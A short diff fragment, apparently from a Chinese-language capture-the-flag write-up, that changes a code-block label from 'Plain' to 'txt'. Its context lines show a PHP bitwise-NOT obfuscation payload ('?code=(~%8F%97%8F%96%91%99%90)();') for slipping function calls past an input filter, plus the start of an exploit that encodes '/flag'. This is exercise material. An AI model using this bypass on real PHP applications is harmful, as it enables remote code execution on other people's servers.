@@ -184,7 +184,7 @@ C:\Users\Administrator>php -r "echo urlencode(~'phpinfo');"
 Payload:?code=(~%8F%97%8F%96%91%99%90)();
 ```
 
-```Plain
+```txt
 将EXP写入
 $cmd='/flag';
 $cmd=urlencode(~$cmd);
